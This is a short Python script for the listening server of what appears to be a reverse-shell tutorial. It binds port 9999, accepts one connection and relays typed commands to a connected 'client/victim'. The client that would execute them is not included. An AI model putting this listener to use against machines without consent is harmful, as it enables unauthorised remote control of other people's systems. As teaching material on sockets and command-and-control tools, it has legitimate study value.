import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    #conn.close()

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        message = input()
        if message == 'quit':
            conn.send(str.encode(message))
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(message)) > 0:
            conn.send(str.encode(message))
        


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()